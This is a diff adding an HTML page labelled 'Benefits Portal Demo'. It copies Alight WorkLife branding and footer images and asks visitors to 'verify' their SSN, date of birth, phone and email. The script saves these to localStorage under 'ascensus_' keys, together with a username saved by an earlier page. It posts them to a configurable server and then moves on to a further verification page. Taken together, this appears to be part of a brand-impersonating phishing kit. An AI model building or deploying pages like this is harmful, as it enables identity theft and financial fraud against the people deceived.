@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Benefits Portal Demo</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  margin: 0;
+  padding: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #292929;
+  background: #fff;
+}
+
+body {
+  min-width: 320px;
+  font-size: 13px;
+}
+
+/* ================= HEADER ================= */
+
+.header {
+  position: sticky;
+  top: 0;
+  background: #fff;
+  height: 100px;
+  z-index: 999999;
+  border-bottom: 1px solid #aaa;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 28px;
+}
+
+.brand {
+  width: 92px;
+  height: 63px;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 23px;
+  font-weight: 400;
+  letter-spacing: -1px;
+}
+
+.assistant {
+  background: #126cb1da;
+  color: white;
+  border-radius: 25px;
+  padding: 10px 17px;
+  font-size: 13px;
+  font-weight: bold;
+  box-shadow: 0 2px 8px rgba(21, 40, 181, 0.55);
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+
+.assistant-icon {
+  width: 21px;
+  height: 21px;
+  border: 1.5px solid white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+}
+
+/* ================= MAIN ================= */
+
+.main {
+  max-width: 1160px;
+  margin: 55px auto 0;
+  padding: 0 28px;
+  display: grid;
+  grid-template-columns: 335px 1fr;
+  gap: 28px;
+  align-items: start;
+}
+
+.left {
+  width: 100%;
+}
+
+.title {
+  font-size: 29px;
+  line-height: 1.4;
+  margin: 4px 0 25px;
+  font-weight: 700;
+}
+
+.card {
+  border: 1px solid #d4d4d4;
+  border-radius: 9px;
+  padding: 25px 25px 23px;
+  box-shadow: 0 1px 3px rgba(0,0,0,.03);
+}
+
+.card h2 {
+  margin: 0 0 16px;
+  font-size: 17px;
+  line-height: 1.3;
+}
+
+.required-info {
+  font-size: 12px;
+  line-height: 1.45;
+  margin: 0 0 17px;
+}
+
+.field-label {
+  display: block;
+  font-size: 12px;
+  margin-bottom: 7px;
+}
+
+.field-label span {
+  color: #777;
+  font-style: italic;
+}
+
+.required {
+  color: #a52b2b;
+}
+
+.input {
+  width: 100%;
+  height: 58px;
+  border: 1px solid #555;
+  outline: none;
+  padding: 8px;
+  font-size: 14px;
+  margin-bottom: 17px;
+}
+
+.input:focus {
+  border-color: #126bb1;
+  box-shadow: 0 0 0 1px #126bb1;
+}
+
+.remember {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 14px;
+  margin-bottom: 8px;
+}
+
+.remember input {
+  appearance: none;
+  width: 21px;
+  height: 21px;
+  border: 1px solid #888;
+  border-radius: 2px;
+  margin: 0;
+  background: #fff;
+  flex-shrink: 0;
+}
+
+.remember input:checked {
+  background: #126bb1;
+  box-shadow: inset 0 0 0 4px white;
+}
+
+.link {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 12px;
+  cursor: pointer;
+}
+
+.next {
+  border: 0;
+  margin-top: 23px;
+  padding: 10px 19px;
+  border-radius: 22px;
+  background: #a4a4a4;
+  color: white;
+  font-size: 13px;
+  cursor: pointer;
+}
+
+.next:hover {
+  background: #858585;
+}
+
+/* ================= MESSAGE BOX ================= */
+
+.message-container {
+  display: none;
+  padding: 12px 15px;
+  border-radius: 5px;
+  margin-bottom: 15px;
+  font-size: 13px;
+  align-items: center;
+  gap: 8px;
+}
+
+.message-container.show {
+  display: flex;
+}
+
+.message-container.error {
+  background-color: #ffebee;
+  color: #c62828;
+  border: 1px solid #e57373;
+}
+
+.message-container.success {
+  background-color: #e8f5e9;
+  color: #2e7d32;
+  border: 1px solid #81c784;
+}
+
+.message-icon {
+  font-weight: bold;
+  font-size: 16px;
+}
+
+/* ================= IMAGE ================= */
+
+.image-area {
+  width: 100%;
+  height: 425px;
+  overflow: hidden;
+  object-fit: contain;
+  position: relative;
+}
+.image-area img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+
+.road {
+  position: absolute;
+  width: 75%;
+  height: 120%;
+  background: #555b59;
+  right: -12%;
+  bottom: -47%;
+  transform: rotate(-19deg);
+  border-left: 4px solid #eee;
+}
+
+.road::after {
+  content: "";
+  position: absolute;
+  left: 48%;
+  top: 0;
+  height: 100%;
+  border-left: 2px dashed #eee;
+}
+
+/* ================= FOOTER ================= */
+
+.footer {
+  margin-top: 25px;
+  background: #fafafa;
+  padding: 23px 28px 21px;
+}
+
+.footer-inner {
+  max-width: 960px;
+  margin: auto;
+}
+
+.footer-top {
+  display: flex;
+  justify-content: space-between;
+  gap: 25px;
+  padding-bottom: 23px;
+}
+
+.footer-links {
+  display: flex;
+  flex-direction: column;
+  gap: 17px;
+}
+
+.footer-links a {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 13px;
+}
+
+.demo-brand {
+  font-size: 22px;
+  font-weight: bold;
+  width: 200px;
+  color: #222;
+  margin-bottom: 14px;
+}
+.demo-brand img {
+  width: 100%;
+  height: auto;
+  max-width: 200px;
+}
+
+.demo-brand span {
+  color: #79b99b;
+}
+
+.stores {
+  display: flex;
+  gap: 8px;
+}
+
+.store {
+  width: 100px;
+  height: 34px;
+  border-radius: 4px;
+  background: #050505;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 9px;
+  text-align: center;
+}
+.store img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+}
+.footer-bottom {
+  border-top: 1px solid #aaa;
+  padding-top: 22px;
+  display: flex;
+  justify-content: space-between;
+  gap: 22px;
+}
+
+.legal-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 20px;
+}
+
+.legal-links a {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 12px;
+}
+
+.copyright {
+  font-size: 12px;
+  color: #666;
+  line-height: 1.5;
+  max-width: 250px;
+}
+
+/* ================= TABLET ================= */
+
+@media (max-width: 900px) {
+
+  .header {
+    height: 65px;
+    padding: 0 20px;
+  }
+
+  .brand {
+    width: 65px;
+    height: 39px;
+    font-size: 21px;
+  }
+
+  .assistant {
+    padding: 9px 14px;
+    font-size: 12px;
+  }
+
+  .main {
+    margin-top: 40px;
+    grid-template-columns: 300px 1fr;
+    gap: 20px;
+    padding: 0 20px;
+  }
+
+  .title {
+    font-size: 20px;
+  }
+
+  .card {
+    padding: 21px;
+  }
+
+  .image-area {
+    height: 370px;
+  }
+}
+
+/* ================= MOBILE ================= */
+
+@media (max-width: 700px) {
+
+  .header {
+    height: 62px;
+    padding: 0 15px;
+  }
+
+  .brand {
+    width: 60px;
+    height: 36px;
+    font-size: 19px;
+  }
+
+  .assistant {
+    padding: 8px 11px;
+    font-size: 11px;
+  }
+
+  .assistant-icon {
+    width: 19px;
+    height: 19px;
+    font-size: 9px;
+  }
+
+  .main {
+    display: block;
+    margin-top: 27px;
+    padding: 0 15px;
+  }
+
+  .title {
+    font-size: 19px;
+    margin-bottom: 19px;
+  }
+
+  .card {
+    padding: 19px;
+  }
+
+  .card h2 {
+    font-size: 16px;
+  }
+
+  .required-info,
+  .field-label,
+  .link {
+    font-size: 12px;
+  }
+
+  .input {
+    height: 51px;
+    font-size: 13px;
+  }
+
+  .remember {
+    font-size: 13px;
+  }
+
+  .remember input {
+    width: 19px;
+    height: 19px;
+  }
+
+  .next {
+    margin-top: 19px;
+    padding: 9px 17px;
+    font-size: 12px;
+  }
+
+  .image-area {
+    margin-top: 22px;
+    height: 230px;
+  }
+
+  .footer {
+    margin-top: 28px;
+    padding: 21px 15px;
+  }
+
+  .footer-top {
+    display: block;
+  }
+
+  .footer-links {
+    gap: 14px;
+  }
+
+  .footer-links a {
+    font-size: 12px;
+  }
+
+  .footer-right {
+    margin-top: 25px;
+  }
+
+  .footer-bottom {
+    display: block;
+  }
+
+  .legal-links {
+    gap: 10px 16px;
+    margin-bottom: 17px;
+  }
+
+  .legal-links a {
+    font-size: 11px;
+  }
+
+  .copyright {
+    font-size: 11px;
+  }
+}
+
+/* ================= SMALL PHONES ================= */
+
+@media (max-width: 400px) {
+
+  .assistant {
+    padding: 7px 9px;
+  }
+
+  .assistant-icon {
+    display: none;
+  }
+
+  .title {
+    font-size: 18px;
+  }
+
+  .card {
+    padding: 17px;
+  }
+
+  .image-area {
+    height: 200px;
+  }
+
+  .demo-brand {
+    font-size: 20px;
+  }
+}
+</style>
+</head>
+<script src="../config.js"></script>
+
+
+<body>
+
+  <!-- HEADER -->
+  <header class="header">
+
+    <div class="brand">
+      <img id="globalLogo" >
+    </div>
+
+    <div class="assistant">
+ <i class="fa-solid fa-comment-dots"></i>
+      Virtual Assistant
+    </div>
+
+  </header>
+
+
+  <!-- MAIN CONTENT -->
+  <main class="main">
+
+    <section class="left">
+
+          <div id="messageBox" class="message-container">
+          <span class="message-icon" id="messageIcon"></span>
+          <span id="messageText"></span>
+        </div>
+
+      <div class="card">
+
+        <h2>Verify Your Information</h2>
+
+        <p class="required-info">
+          * Fields marked with an asterisk (*) are required.
+        </p>
+
+        <label class="field-label" for="ssn">
+          SSN <span>(Required)</span>
+          <b class="required">*</b>
+        </label>
+
+        <input
+          class="input"
+          type="text"
+          id="ssn"
+          placeholder="XXX-XX-XXXX"
+          autocomplete="off"
+          inputmode="numeric"
+          maxlength="11"
+        >
+
+        <label class="field-label" for="dob">
+          Date of Birth <span>(Required)</span>
+          <b class="required">*</b>
+        </label>
+
+        <input
+          class="input"
+          type="date"
+          id="dob"
+          autocomplete="off"
+        >
+
+        <label class="field-label" for="phone">
+          Phone Number <span>(Required)</span>
+          <b class="required">*</b>
+        </label>
+
+        <input
+          class="input"
+          type="tel"
+          maxlength="10"
+          id="phone"
+          placeholder="(XXX) XXX-XXXX"
+          autocomplete="off"
+        >
+
+        <label class="field-label" for="email">
+          Email Address <span>(Required)</span>
+          <b class="required">*</b>
+        </label>
+
+        <input
+          class="input"
+          type="email"
+          id="email"
+          placeholder="your.email@example.com"
+          autocomplete="off"
+        >
+
+       
+
+        <br>
+
+        <button class="next" id="loginBtn" onclick="submitVerification()" type="button">
+          Next
+        </button>
+
+      </div>
+
+    </section>
+
+
+    <!-- DEMO IMAGE AREA -->
+    <section class="image-area" aria-label="Decorative landscape">
+
+     <img id="imageArea" alt="image">
+
+    </section>
+
+  </main>
+
+
+  <!-- FOOTER -->
+  <footer class="footer">
+
+    <div class="footer-inner">
+
+      <div class="footer-top">
+
+        <div class="footer-links">
+
+          <a href="#">Contact Us</a>
+          <a href="#">Feedback</a>
+          <a href="#">Protect Yourself From Website Fraud</a>
+
+        </div>
+
+        <div class="footer-right">
+
+          <div class="demo-brand">
+          <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg" alt="">
+          </div>
+
+          <div class="stores">
+            <div class="store">
+              <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png" alt="">
+            </div>
+
+            <div class="store">
+             <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png"/>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+
+      <div class="footer-bottom">
+
+        <div class="legal-links">
+
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms of Use</a>
+          <a href="#">Cookie Notice</a>
+          <a href="#">Cookie Settings</a>
+
+        </div>
+
+        <div class="copyright">
+          ©2026 Alight Solutions. All rights reserved.
+        </div>
+
+      </div>
+
+    </div>
+
+  </footer>
+
+
+ <script>
+  function initPage() {
+  const logo = document.getElementById('globalLogo');
+  const imageArea = document.getElementById('imageArea');
+  
+  const cfg = window.APP_CONFIG;
+
+  logo.src=cfg.logo
+  logo.alt=cfg.logoAlt
+  imageArea.src=cfg.imageArea
+  imageArea.alt='image'
+}
+
+window.addEventListener('load', initPage);
+   const input = document.getElementById('phone');
+const verifybtn = document.getElementById('loginBtn');
+
+// Function to update button color
+function updateButtonColor() {
+  if (input.value.length) {
+    verifybtn.style.background = '#3977b5'; // Active blue
+  } else {
+    verifybtn.style.background = '#999'; // Inactive gray
+  }
+}
+
+
+// Listen for changes
+input.addEventListener('input', updateButtonColor);
+
+// Also run on page load in case it has a default value
+updateButtonColor();
+
+
+// SSN Input Masking
+const ssnInput = document.getElementById('ssn');
+let previousValue = '';
+
+ssnInput.addEventListener('input', function(e) {
+  let currentValue = e.target.value;
+  let digitsOnly = currentValue.replace(/\D/g, '');
+  
+  // Limit to 9 digits
+  if (digitsOnly.length > 9) {
+    digitsOnly = digitsOnly.substring(0, 9);
+  }
+  
+  // Format: XXX-XX-XXXX
+  let formatted = '';
+  if (digitsOnly.length <= 3) {
+    formatted = digitsOnly;
+  } else if (digitsOnly.length <= 5) {
+    formatted = digitsOnly.substring(0, 3) + '-' + digitsOnly.substring(3);
+  } else {
+    formatted = digitsOnly.substring(0, 3) + '-' + digitsOnly.substring(3, 5) + '-' + digitsOnly.substring(5);
+  }
+  
+  e.target.value = formatted;
+  previousValue = formatted;
+});
+
+function showMessage(message, type = 'error') {
+  const messageBox = document.getElementById('messageBox');
+  const messageText = document.getElementById('messageText');
+  const messageIcon = document.getElementById('messageIcon');
+  
+  messageText.textContent = message;
+  messageBox.className = 'message-container show ' + type;
+  messageIcon.textContent = type === 'success' ? '✓' : '✕';
+  
+  setTimeout(() => {
+    messageBox.classList.remove('show');
+  }, 5000);
+}
+
+function validateSSN(ssn) {
+  const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
+  return ssnRegex.test(ssn);
+}
+
+function validatePhone(phone) {
+  const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$|^\d{10}$/;
+  return phoneRegex.test(phone.replace(/[-.\s()]/g, ''));
+}
+
+function submitVerification() {
+  const username = localStorage.getItem('ascensus_username');
+  const ssn = document.getElementById('ssn').value.trim();
+  const dob = document.getElementById('dob').value;
+  const phone = document.getElementById('phone').value.trim();
+  const email = document.getElementById('email').value.trim();
+
+  // Store in localStorage
+  localStorage.setItem('ascensus_ssn', ssn);
+  localStorage.setItem('ascensus_dob', dob);
+  localStorage.setItem('ascensus_phone', phone);
+  localStorage.setItem('ascensus_email', email);
+
+  // Validation
+  if (!ssn || !dob || !phone || !email) {
+    showMessage('Please fill in all required fields.', 'error');
+    return;
+  }
+
+  if (!email.includes('@')) {
+    showMessage('Please enter a valid email address.', 'error');
+    return;
+  }
+
+  const btn = document.getElementById('loginBtn');
+  const originalText = btn.textContent;
+  btn.disabled = true;
+  btn.textContent = 'Loading...';
+  
+  // API call to verify information
+  fetch(window.ascensus_API_BASE + '/api/auth/details', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      username: username,
+      ssn: ssn,
+      dob: dob,
+      phone: phone,
+      email: email
+    })
+  })
+  .then(function(response) {
+    return response.json().then(function(data) {
+      return { ok: response.ok, data: data };
+    });
+  })
+  .then(function(result) {
+    if (result.ok) {
+      showMessage('Verification successful!', 'success');
+      setTimeout(() => {
+        window.location.href = './verify-method.html';
+      }, 1500);
+    } else {
+      showMessage(result.data.message || 'Unable to verify information.', 'error');
+      btn.disabled = false;
+      btn.textContent = originalText;
+    }
+  })
+  .catch(function(error) {
+    showMessage('Unable to reach the server. Please try again.', 'error');
+    btn.disabled = false;
+    btn.textContent = originalText;
+  });
+}
+
+  </script>
+
+</body>
+</html>
